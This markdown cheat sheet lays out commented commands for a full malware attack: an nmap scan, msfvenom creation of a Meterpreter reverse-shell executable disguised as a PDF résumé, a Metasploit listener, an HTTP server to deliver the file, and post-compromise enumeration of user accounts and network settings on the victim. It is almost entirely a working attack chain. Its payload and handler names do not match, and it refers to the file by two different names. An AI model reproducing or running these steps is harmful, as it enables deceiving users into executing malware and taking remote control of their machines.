
# 🛡️ Commands for Malware Attack (With Comments)

## 🔍 Reconnaissance

```bash
# Scan the target machine aggressively and skip host discovery
nmap -A 192.168.20.10 -Pn
```

---

## 💣 Payload Creation

```bash
# List all available payloads in msfvenom
msfvenom -l payloads
```

```bash
# Generate a reverse TCP payload disguised as a .exe file
# Replace LHOST with your attacker's IP and LPORT with a listening port
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.20.11 LPORT=4445 -f exe -o resume1.pdf.exe
```

```bash
# Check the file type of the payload to confirm it is an executable
file Attemp1.pdf.exe
```

---

## 🎯 Metasploit Console Commands

```bash
# Start Metasploit Framework console
msfconsole
```

```bash
# Use the exploit handler for managing reverse connections
use exploit/multi/handler
```

```bash
# Show current settings and options
options
```

```bash
# Set the same payload used in msfvenom
set payload windows/x64/meterpreter/reverse_tcp
```

```bash
# Show options again to verify payload settings
options
```

```bash
# Set the local host (attacker machine's IP)
set LHOST 192.168.20.11
```

```bash
# Show final configuration before launch
options
```

```bash
# Start the exploit and wait for incoming connection
exploit
```

---

## 🌐 Hosting the Payload (New Terminal Tab)

```bash
# List files in the current directory to ensure the payload is present
ls
```

```bash
# Start a simple HTTP server on port 9999 to serve the payload
python3 -m http.server 9999
```

---

## 🧠 Meterpreter Shell (After Target Executes Payload)

```bash
# Switch to a basic shell on the victim's machine
shell
```

```bash
# View user accounts on the system
net user
```

```bash
# Check local admin groups and memberships
net localgroup
```

```bash
# View IP configuration of the compromised system
ipconfig
```
